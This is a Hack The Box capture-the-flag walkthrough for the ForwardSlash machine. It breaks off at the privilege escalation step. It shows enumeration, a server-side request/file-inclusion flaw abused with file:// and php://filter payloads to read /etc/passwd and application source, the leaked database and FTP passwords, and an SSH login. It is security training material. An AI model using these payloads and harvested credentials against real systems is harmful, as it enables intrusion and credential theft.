---
permalink: /posts/HTB/ForwardSlash
title:  "HTB ForwardSlash"
author: Luc Kolen
description: "ForwardSlash is a hard Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Hard
  - Linux
  - Gobuster
  - Wfuzz
  - Local file inclusion
  - Suid
  - Ghidra
  - Luks
---
# 10.10.10.183 - ForwardSlash

|Hack The Box|Created by|Points|
|---|---|---|
|[Link](https://www.hackthebox.eu/home/machines/profile/239)|[InfoSecJack](https://www.hackthebox.eu/home/users/profile/52045) & [chivato](https://www.hackthebox.eu/home/users/profile/44614)|40|

- [10.10.10.183 - ForwardSlash](#101010183---forwardslash)
  - [Open ports](#open-ports)
  - [HTTP](#http)
  - [Privilege escalation](#privilege-escalation)
    - [Chiv -> Pain](#chiv---pain)
    - [Pain -> root](#pain---root)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [Unintended root from pain](#unintended-root-from-pain)

## Open ports

```bash
luc@kali:~/HTB/ForwardSlash$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.183
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp|http|Apache httpd 2.4.29 ((Ubuntu))

## HTTP

Browsing to `http://10.10.10.183` redirects us to `http://forwardslash.htb` which can't be resolved so we'll need to add that entry to our `/etc/hosts` file.

```bash
luc@kali:~/HTB/ForwardSlash$ sudo nano /etc/hosts
...
10.10.10.183    forwardslash.htb
```

![Forwardslash.htb](/assets/images/HTB-ForwardSlash/1.a%20forwardslash.htb%20homepage.png)

We can see that this website is defaced and that `XML` and `Automatic FTP Logins` were used.

```bash
luc@kali:~/HTB/ForwardSlash$ gobuster dir -u http://forwardslash.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://forwardslash.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,asp,aspx,jsp,txt
[+] Timeout:        10s
===============================================================
2020/07/08 11:15:32 Starting gobuster
===============================================================
/index.php (Status: 200)
/note.txt (Status: 200)
Progress: 69306 / 220561 (31.42%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/07/08 11:26:07 Finished
===============================================================
```

Running `Gobuster` on this website shows a `note.txt` file.

```text
Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name...
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.

-chiv
```

Port 80 is the only open `HTTP` port so we can assume virtual host routing is used.

```bash
luc@kali:~/HTB/ForwardSlash$ wfuzz -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.forwardslash.htb" --hw 0 http://10.10.10.183

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.183/
Total requests: 4997

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000055:   302        0 L      6 W      33 Ch       "backup"
000000690:   400        12 L     53 W     422 Ch      "gc._msdcs"

Total time: 6.907552
Processed Requests: 4997
Filtered Requests: 4995
Requests/sec.: 723.4111
```

`Wfuzz` finds `backup.forwardslash.htb` so we'll update `/etc/hosts`.

```bash
luc@kali:~/HTB/ForwardSlash$ sudo nano /etc/hosts
...
10.10.10.183    forwardslash.htb backup.forwardslash.htb
```

![backup.forwardslash.htb login](/assets/images/HTB-ForwardSlash/1.b%20backup.forwardslash.htb%20login.png)

We've the option to login and to create an account. We'll create an account `test` with password `test123`. We're shown the option to change our profile picture, but it's disabled after the hack.

![backup.forwardslash.htb/profilepicture.php](/assets/images/HTB-ForwardSlash/1.c%20backup.forwardslash.htb-profilepicture.php.png)

```html
<form action="/profilepicture.php" method="post">
URL:
<input type="text" name="url" disabled style="width:600px"><br>
<input style="width:200px" type="submit" value="Submit" disabled>
```

We can look at the source and see that the `disabled` attribute has been added. This attribute can be removed and now we can use the form.

```http
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://backup.forwardslash.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://backup.forwardslash.htb/profilepicture.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,nl;q=0.8
Cookie: PHPSESSID=u8nnf7pampis528hfg56mqnn57
Connection: close

url=http%3A%2F%2F10.10.14.11%3A8000%2Flogo.png
```

```bash
luc@kali:~/HTB/ForwardSlash$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.183 - - [08/Jul/2020 12:34:12] code 404, message File not found
10.10.10.183 - - [08/Jul/2020 12:34:12] "GET /logo.png HTTP/1.0" 404 -
```

Hosting our own webserver and requesting a file from that webserver shows that a `GET` request is done to the URL. This shows that the form is only disabled on the front end and that the backend is still processing the request.

```http
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb

...
url=file:///etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```

Editing the value in the url parameter to `file:///etc/passwd` will load `/etc/passwd` on the webserver. This gives us all users on the machine, `root`, `pain` and `chiv`.

```http
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
...

url=php://filter/convert.base64-encode/resource=profilepicture.php
```

```text
PD9waHAKLy8gSW5pdGlhbGl6ZSB0aGUgc2Vzc2lvbgpzZXNzaW9uX3N0YXJ0KCk7CgovLyBDaGVjayBpZiB0aGUgdXNlciBpcyBsb2dnZWQgaW4sIGlmIG5vdCB0aGVuIHJlZGlyZWN0IGhpbSB0byBsb2dpbiBwYWdlCmlmKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSl7CiAgICBoZWFkZXIoImxvY2F0aW9uOiBsb2dpbi5waHAiKTsKICAgIGV4aXQ7Cn0KLyoKaWYgKGlzc2V0KCRfR0VUWydzdWNjZXNzJ10pKXsKCWVjaG8gPGgxPlByb2ZpbGUgUGljdHVyZSBDaGFuZ2UgU3VjY2Vzc2Z1bGx5ITwvaDE+OwoJZXhpdDsKfQoqLwo/Pgo8IURPQ1RZUEUgaHRtbD4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+V2VsY29tZTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImJvb3RzdHJhcC5jc3MiPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KICAgICAgICBib2R5eyBmb250OiAxNHB4IHNhbnMtc2VyaWY7IHRleHQtYWxpZ246IGNlbnRlcjsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9InBhZ2UtaGVhZGVyIj4KICAgICAgICA8aDE+Q2hhbmdlIHlvdXIgUHJvZmlsZSBQaWN0dXJlITwvaDE+Cgk8Zm9udCBzdHlsZT0iY29sb3I6cmVkIj5UaGlzIGhhcyBhbGwgYmVlbiBkaXNhYmxlZCB3aGlsZSB3ZSB0cnkgdG8gZ2V0IGJhY2sgb24gb3VyIGZlZXQgYWZ0ZXIgdGhlIGhhY2suPGJyPjxiPi1QYWluPC9iPjwvZm9udD4KICAgIDwvZGl2Pgo8Zm9ybSBhY3Rpb249Ii9wcm9maWxlcGljdHVyZS5waHAiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgVVJMOgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1cmwiIGRpc2FibGVkIHN0eWxlPSJ3aWR0aDo2MDBweCI+PGJyPgogICAgICAgIDxpbnB1dCBzdHlsZT0id2lkdGg6MjAwcHgiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCIgZGlzYWJsZWQ+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cjw/cGhwCmlmIChpc3NldCgkX1BPU1RbJ3VybCddKSkgewogICAgICAgICR1cmwgPSAnaHR0cDovL2JhY2t1cC5mb3J3YXJkc2xhc2guaHRiL2FwaS5waHAnOwogICAgICAgICRkYXRhID0gYXJyYXkoJ3VybCcgPT4gJF9QT1NUWyd1cmwnXSk7CgogICAgICAgICRvcHRpb25zID0gYXJyYXkoCiAgICAgICAgICAgICAgICAnaHR0cCcgPT4gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICdoZWFkZXInICA9PiAiQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+IGh0dHBfYnVpbGRfcXVlcnkoJGRhdGEpCiAgICAgICAgICAgICAgICApCiAgICAgICAgKTsKICAgICAgICAkY29udGV4dCA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgkb3B0aW9ucyk7CiAgICAgICAgJHJlc3VsdCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7CiAgICAgICAgZWNobyAkcmVzdWx0OwoJZXhpdDsKfQo/Pgo=
```

```bash
luc@kali:~/HTB/ForwardSlash$ mkdir backup-source
luc@kali:~/HTB/ForwardSlash$ cd backup-source/
luc@kali:~/HTB/ForwardSlash/backup-source$ echo 'PD9waHAKLy8gSW5pdGlhbGl6ZSB0aGUgc2Vzc2lvbgpzZXNzaW9uX3N0YXJ0KCk7CgovLyBDaGVjayBpZiB0aGUgdXNlciBpcyBsb2dnZWQgaW4sIGlmIG5vdCB0aGVuIHJlZGlyZWN0IGhpbSB0byBsb2dpbiBwYWdlCmlmKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSl7CiAgICBoZWFkZXIoImxvY2F0aW9uOiBsb2dpbi5waHAiKTsKICAgIGV4aXQ7Cn0KLyoKaWYgKGlzc2V0KCRfR0VUWydzdWNjZXNzJ10pKXsKCWVjaG8gPGgxPlByb2ZpbGUgUGljdHVyZSBDaGFuZ2UgU3VjY2Vzc2Z1bGx5ITwvaDE+OwoJZXhpdDsKfQoqLwo/Pgo8IURPQ1RZUEUgaHRtbD4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+V2VsY29tZTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImJvb3RzdHJhcC5jc3MiPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KICAgICAgICBib2R5eyBmb250OiAxNHB4IHNhbnMtc2VyaWY7IHRleHQtYWxpZ246IGNlbnRlcjsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9InBhZ2UtaGVhZGVyIj4KICAgICAgICA8aDE+Q2hhbmdlIHlvdXIgUHJvZmlsZSBQaWN0dXJlITwvaDE+Cgk8Zm9udCBzdHlsZT0iY29sb3I6cmVkIj5UaGlzIGhhcyBhbGwgYmVlbiBkaXNhYmxlZCB3aGlsZSB3ZSB0cnkgdG8gZ2V0IGJhY2sgb24gb3VyIGZlZXQgYWZ0ZXIgdGhlIGhhY2suPGJyPjxiPi1QYWluPC9iPjwvZm9udD4KICAgIDwvZGl2Pgo8Zm9ybSBhY3Rpb249Ii9wcm9maWxlcGljdHVyZS5waHAiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgVVJMOgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1cmwiIGRpc2FibGVkIHN0eWxlPSJ3aWR0aDo2MDBweCI+PGJyPgogICAgICAgIDxpbnB1dCBzdHlsZT0id2lkdGg6MjAwcHgiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCIgZGlzYWJsZWQ+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cjw/cGhwCmlmIChpc3NldCgkX1BPU1RbJ3VybCddKSkgewogICAgICAgICR1cmwgPSAnaHR0cDovL2JhY2t1cC5mb3J3YXJkc2xhc2guaHRiL2FwaS5waHAnOwogICAgICAgICRkYXRhID0gYXJyYXkoJ3VybCcgPT4gJF9QT1NUWyd1cmwnXSk7CgogICAgICAgICRvcHRpb25zID0gYXJyYXkoCiAgICAgICAgICAgICAgICAnaHR0cCcgPT4gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICdoZWFkZXInICA9PiAiQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+IGh0dHBfYnVpbGRfcXVlcnkoJGRhdGEpCiAgICAgICAgICAgICAgICApCiAgICAgICAgKTsKICAgICAgICAkY29udGV4dCA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgkb3B0aW9ucyk7CiAgICAgICAgJHJlc3VsdCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7CiAgICAgICAgZWNobyAkcmVzdWx0OwoJZXhpdDsKfQo/Pgo=' | base64 -d > profilepicture.php
```

```php
<?php
// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: login.php");
    exit;
}
/*
if (isset($_GET['success'])){
        echo <h1>Profile Picture Change Successfully!</h1>;
        exit;
}
*/
?>
<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Change your Profile Picture!</h1>
        <font style="color:red">This has all been disabled while we try to get back on our feet after the hack.<br><b>-Pain</b></font>
    </div>
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
</body>
</html>
<?php
if (isset($_POST['url'])) {
        $url = 'http://backup.forwardslash.htb/api.php';
        $data = array('url' => $_POST['url']);

        $options = array(
                'http' => array(
                        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                        'method'  => 'POST',
                        'content' => http_build_query($data)
                )
        );
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
        echo $result;
        exit;
}
?>
```

We can use a PHP filter to read source code and we can see that a call is made to `http://backup.forwardslash.htb/api.php` with the parameter `url` to load a file.

```http
POST /api.php HTTP/1.1
Host: backup.forwardslash.htb
...

url=php://filter/convert.base64-encode/resource=api.php
```

```text
PD9waHAKCnNlc3Npb25fc3RhcnQoKTsKCmlmIChpc3NldCgkX1BPU1RbJ3VybCddKSkgewoKCWlmKCghaXNzZXQoJF9TRVNTSU9OWyJsb2dnZWRpbiJdKSB8fCAkX1NFU1NJT05bImxvZ2dlZGluIl0gIT09IHRydWUpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CgkJZWNobyAiVXNlciBtdXN0IGJlIGxvZ2dlZCBpbiB0byB1c2UgQVBJIjsKCQlleGl0OwoJfQoKCSRwaWN0dXJlID0gZXhwbG9kZSgiLS0tLS1vdXRwdXQtLS0tLTxicj4iLCBmaWxlX2dldF9jb250ZW50cygkX1BPU1RbJ3VybCddKSk7CglpZiAoc3RycG9zKCRwaWN0dXJlWzBdLCAic2Vzc2lvbl9zdGFydCgpOyIpICE9PSBmYWxzZSkgewoJCWVjaG8gIlBlcm1pc3Npb24gRGVuaWVkOyBub3QgdGhhdCB3YXkgOykiOwoJCWV4aXQ7Cgl9CgllY2hvICRwaWN0dXJlWzBdOwoJZXhpdDsKfQo/Pgo8IS0tIFRPRE86IHJlbW92ZWQgYWxsIHRoZSBjb2RlIHRvIGFjdHVhbGx5IGNoYW5nZSB0aGUgcGljdHVyZSBhZnRlciBiYWNrc2xhc2ggZ2FuZyBhdHRhY2tlZCB1cywgc2ltcGx5IGVjaG9zIGFzIGRlYnVnIG5vdyAtLT4K
```

```bash
luc@kali:~/HTB/ForwardSlash/backup-source$ echo -n 'PD9waHAKCnNlc3Npb25fc3RhcnQoKTsKCmlmIChpc3NldCgkX1BPU1RbJ3VybCddKSkgewoKCWlmKCghaXNzZXQoJF9TRVNTSU9OWyJsb2dnZWRpbiJdKSB8fCAkX1NFU1NJT05bImxvZ2dlZGluIl0gIT09IHRydWUpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CgkJZWNobyAiVXNlciBtdXN0IGJlIGxvZ2dlZCBpbiB0byB1c2UgQVBJIjsKCQlleGl0OwoJfQoKCSRwaWN0dXJlID0gZXhwbG9kZSgiLS0tLS1vdXRwdXQtLS0tLTxicj4iLCBmaWxlX2dldF9jb250ZW50cygkX1BPU1RbJ3VybCddKSk7CglpZiAoc3RycG9zKCRwaWN0dXJlWzBdLCAic2Vzc2lvbl9zdGFydCgpOyIpICE9PSBmYWxzZSkgewoJCWVjaG8gIlBlcm1pc3Npb24gRGVuaWVkOyBub3QgdGhhdCB3YXkgOykiOwoJCWV4aXQ7Cgl9CgllY2hvICRwaWN0dXJlWzBdOwoJZXhpdDsKfQo/Pgo8IS0tIFRPRE86IHJlbW92ZWQgYWxsIHRoZSBjb2RlIHRvIGFjdHVhbGx5IGNoYW5nZSB0aGUgcGljdHVyZSBhZnRlciBiYWNrc2xhc2ggZ2FuZyBhdHRhY2tlZCB1cywgc2ltcGx5IGVjaG9zIGFzIGRlYnVnIG5vdyAtLT4K' | base64 -d > api.php
```

```php
<?php

session_start();

if (isset($_POST['url'])) {

        if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
                echo "User must be logged in to use API";
                exit;
        }

        $picture = explode("-----output-----<br>", file_get_contents($_POST['url']));
        if (strpos($picture[0], "session_start();") !== false) {
                echo "Permission Denied; not that way ;)";
                exit;
        }
        echo $picture[0];
        exit;
}
?>
<!-- TODO: removed all the code to actually change the picture after backslash gang attacked us, simply echos as debug now -->
```

Loading files from the server via the `backup.forwardslash.htb/api.php` page is cleaner because we don't get the HTML page for the profile picture webpage.

```bash
luc@kali:~/HTB/ForwardSlash/backup-source$ wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 'PHPSESSID=u8nnf7pampis528hfg56mqnn57' -d 'url=php://filter/convert.base64-encode/resource=FUZZ.php' --hw 0 http://backup.forwardslash.htb/api.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://backup.forwardslash.htb/api.php
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000015:   200        0 L      1 W      1392 Ch     "index"
000000053:   200        0 L      1 W      6112 Ch     "login"
000000065:   200        0 L      1 W      6872 Ch     "register"
000000258:   200        0 L      1 W      1632 Ch     "welcome"
000001026:   200        0 L      1 W      768 Ch      "api"
000001111:   200        0 L      1 W      1656 Ch     "environment"
000001225:   200        0 L      1 W      596 Ch      "logout"
000001490:   200        0 L      1 W      760 Ch      "config"
000004802:   200        0 L      1 W      3344 Ch     "hof"

Total time: 375.2913
Processed Requests: 220560
Filtered Requests: 220551
Requests/sec.: 587.7034
```

`Wfuzz` shows that `index.php`, `login.php`, `register.php`, `welcome.php`, `api.php`, `environment.php`, `logout.php`, `config.php` and `hof.php` exist in the current working directory.

```bash
luc@kali:~/HTB/ForwardSlash/backup-source$ curl http://backup.forwardslash.htb/api.php -d 'url=php://filter/convert.base64-encode/resource=config.php' -b 'PHPSESSID=u8nnf7pampis528hfg56mqnn57' -s | base64 -d > config.php
```

```php
<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
define('DB_NAME', 'site');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

`config.php` sounds the most interesting so we'll take a look at that first and we find that the old config file has been backed up. We do get the database password for `www-data` and its password.

```bash
luc@kali:~/HTB/ForwardSlash$ gobuster dir -u http://backup.forwardslash.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backup.forwardslash.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     asp,aspx,jsp,txt,html,php
[+] Timeout:        10s
===============================================================
2020/07/08 13:39:02 Starting gobuster
===============================================================
/index.php (Status: 302)
/login.php (Status: 200)
/register.php (Status: 200)
/welcome.php (Status: 302)
/dev (Status: 301)
/api.php (Status: 200)
/environment.php (Status: 302)
/logout.php (Status: 302)
/config.php (Status: 200)
/hof.php (Status: 302)
Progress: 9175 / 220561 (4.16%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/07/08 13:40:28 Finished
===============================================================
```

Running `Gobuster` on the `backup.forwardslash.htb` site shows a `/dev` directory. Browsing to `http://backup.forwardslash.htb/dev/` shows `403 Access Denied Access Denied From 10.10.14.11` but we can export the source code for this website via the vulnerability we found earlier.

```bash
luc@kali:~/HTB/ForwardSlash/backup-source$ mkdir dev
luc@kali:~/HTB/ForwardSlash/backup-source$ cd dev/
luc@kali:~/HTB/ForwardSlash/backup-source/dev$ curl http://backup.forwardslash.htb/api.php -d 'url=php://filter/convert.base64-encode/resource=dev/index.php' -b 'PHPSESSID=u8nnf7pampis528hfg56mqnn57' -s | base64 -d > index.php
```

```php
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
        <h1>XML Api Test</h1>
        <h3>This is our api test for when our new website gets refurbished</h3>
        <form action="/dev/index.php" method="get" id="xmltest">
                <textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
                <input type="submit">
        </form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

        $reg = '/ftp:\/\/[\s\S]*\/\"/';
        //$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

        if (preg_match($reg, $_GET['xml'], $match)) {
                $ip = explode('/', $match[0])[2];
                echo $ip;
                error_log("Connecting");

                $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

                error_log("Logging in");

                if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

                        error_log("Getting file");
                        echo ftp_get_string($conn_id, "debug.txt");
                }

                exit;
        }

        libxml_disable_entity_loader (false);
        $xmlfile = $_GET["xml"];
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $api = simplexml_import_dom($dom);
        $req = $api->request;
        echo "-----output-----<br>\r\n";
        echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

This source code shows the FTP credentials for `chiv` and the password `N0bodyL1kesBack/`.

```bash
luc@kali:~/HTB/ForwardSlash/backup-source/dev$ ssh chiv@forwardslash.htb
chiv@forwardslash.htb's password: N0bodyL1kesBack/
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  8 11:48:46 UTC 2020

  System load:  0.06               Processes:            171
  Usage of /:   32.7% of 19.56GB   Users logged in:      0
  Memory usage: 21%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul  8 11:48:13 2020 from 10.10.14.11
chiv@forwardslash:~$ id
uid=1001(chiv) gid=1001(chiv) groups=1001(chiv)
```

## Privilege escalation

### Chiv -> Pain

```bash
chiv@forwardslash:~$ find / -name 'user.txt' 2>/dev/null
/home/pain/user.txt
chiv@forwardslash:~$ cat /home/pain/user.txt
cat: /home/pain/user.txt: Permission denied
```

We're logged in as chiv, but we can't read the `user.txt` file yet so we need to get access to `pain` (or `root`).

```bash
chiv@forwardslash:~$ find / -perm /4000 2>/dev/null
...
/usr/bin/backup
...
chiv@forwardslash:~$ ls -lsa /usr/bin/backup
16 -r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
```

`/usr/bin/backup` can be execute by `chiv` and will run as `pain`.

```bash
chiv@forwardslash:~$ /usr/bin/backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 12:09:08
ERROR: 5bd78d99f7e873c49ef7204a03015040 Does Not Exist or Is Not Accessible By Me, Exiting...
```

Executing this file shows the current time and an error message.

```bash
luc@kali:~/HTB/ForwardSlash$ scp chiv@forwardslash.htb:/usr/bin/backup .
